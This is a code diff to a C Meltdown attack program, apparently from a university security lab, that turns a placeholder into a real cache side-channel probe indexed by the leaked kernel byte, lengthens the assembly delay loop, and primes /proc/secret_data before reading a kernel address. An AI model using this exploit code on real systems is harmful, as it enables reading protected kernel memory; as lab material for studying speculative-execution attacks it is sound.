@@ -50,7 +50,7 @@ void meltdown(unsigned long kernel_data_addr)
    
   // The following statement will cause an exception
   kernel_data = *(char*)kernel_data_addr;     
-  array[7 * 4096 + DELTA] += 1;          
+  array[kernel_data * 4096 + DELTA] += 1;          
 }
 
 void meltdown_asm(unsigned long kernel_data_addr)
@@ -59,7 +59,7 @@ void meltdown_asm(unsigned long kernel_data_addr)
    
    // Give eax register something to do
    asm volatile(
-       ".rept 400;"                
+       ".rept 800;"                
        "add $0x141, %%eax;"
        ".endr;"                    
     
@@ -80,6 +80,17 @@ static void catch_segv()
   siglongjmp(jbuf, 1);
 }
 
+int cache_kernel_data(){
+	// Open the /proc/secret_data virtual file.
+	int fd = open("/proc/secret_data", O_RDONLY);
+	if (fd < 0) {
+		perror("open");
+		return -1;
+	}
+	int ret = pread(fd, NULL, 0, 0); // Cause the secret data to be cached.
+	return 0;
+}
+
 int main()
 {
   // Register a signal handler
@@ -87,9 +98,17 @@ int main()
 
   // FLUSH the probing array
   flushSideChannel();
+  
+  // Open the /proc/secret_data virtual file.
+	int fd = open("/proc/secret_data", O_RDONLY);
+	if (fd < 0) {
+		perror("open");
+		return -1;
+	}
+	int ret = pread(fd, NULL, 0, 0); // Cause the secret data to be cached.
     
   if (sigsetjmp(jbuf, 1) == 0) {
-     meltdown(0xcd63d16b);
+     meltdown_asm(0xb06b2842);
   }
   else {
       printf("Memory access violation!\n");
